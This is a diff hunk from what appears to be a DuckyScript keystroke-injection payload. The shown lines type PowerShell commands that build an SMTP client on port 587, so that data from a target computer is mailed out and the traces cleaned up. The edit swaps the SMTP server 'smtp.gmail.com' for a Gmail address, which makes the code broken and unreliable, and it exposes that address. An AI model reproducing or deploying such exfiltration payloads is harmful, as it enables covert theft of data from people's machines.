@@ -47,7 +47,7 @@ REM *****************
 REM # Let's e-mail ourselves and clean up
 REM *****************
 DELAY 1000
-STRING $SMTPServer = 'smtp.gmail.com'
+STRING $SMTPServer = 'raircom8@gmail.com'
 ENTER
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
